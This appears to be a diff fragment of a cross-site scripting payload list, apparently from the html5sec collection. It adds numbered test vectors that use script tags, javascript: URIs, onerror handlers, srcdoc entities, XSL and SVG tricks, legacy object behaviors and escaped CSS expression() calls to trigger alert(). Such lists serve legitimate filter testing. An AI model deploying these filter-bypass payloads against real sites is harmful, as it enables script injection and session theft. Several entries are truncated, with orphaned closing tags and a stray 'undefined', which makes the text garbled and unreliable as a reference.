+<div id="120"><script>function makePopups(){for (i=1;i<6;i++) {window.open('popup.html','spam'+i,'width=50,height=50');}}</script>
+<div id="121"><html xmlns="http://www.w3.org/1999/xhtml"
+</html>//["'`-->]]>]</div>
+<div id="122"><iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe>//["'`-->]]>]</div>
+<div id="123"><span class=foo>Some text</span>
+<script>$("span.foo").click(function() {alert('foo');$("a.bar").click();});$("a.bar").click(function() {alert('bar');location="http://html5sec.org";});</script>//["'`-->]]>]</div>
+<div id="124"><script src="/\example.com\foo.js"></script> // Safari 5.0, Chrome 9, 10
+<script src="\\example.com\foo.js"></script> // Safari 5.0//["'`-->]]>]</div>
+<div id="125"><?xml version="1.0"?>
+<xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">        <xsl:template match="/"><iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(125)"></iframe>        </xsl:template></xsl:stylesheet><circle fill="red" r="40"></circle></svg>//["'`-->]]>]</div>
+<div id="126"><object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object>
+<object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="alert(126)" style="behavior:url(#x);"><param name=postdomevents /></object>//["'`-->]]>]</div>
+<div id="127"><svg xmlns="http://www.w3.org/2000/svg" id="x">
+</svg>//["'`-->]]>]</div>
+<div id="129"><svg>
+</svg>//["'`-->]]>]</div>
+<div id="130"><math href="javascript:alert(130)">CLICKME</math>
+</math>//["'`-->]]>]</div>
+<div id="dropbox" style="height: 360px;width: 500px;border: 5px solid #000;position: relative;" ondragover="event.preventDefault()">+ Drop Box +</div>//["'`-->]]>]</div>
+<div id="132"><!doctype html>
+</svg>//["'`-->]]>]</div>
+<div id="133"><!-- `<img/src=xx:xx onerror=alert(133)//--!>//["'`-->]]>]</div>
+<div id="134"><xmp>
+*{color:red}</style>//["'`-->]]>]</div>
+<div id="135"><?xml-stylesheet type="text/xsl" href="#" ?>
+</stylesheet>//["'`-->]]>]</div>
+<div id="136"><form action="" method="post">
+</form>//["'`-->]]>]</div>
+<div id="137"><svg>
+<div id="138"><link rel="import" href="test.svg" />//["'`-->]]>]</div><div id="139"><iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />//["'`-->]]>]</div>undefined
+<div style=xss:expression(alert(1))>
+<div style=xss:expression(1)-alert(1)>
+<div style=xss:expressio\6e(alert(1))>
+<div style=xss:expressio\006e(alert(1))>
+<div style=xss:expressio\00006e(alert(1))>
+<div style=xss:expressio\6e(alert(1))>
+<div style=xss:expressio&#x5c;6e(alert(1))>
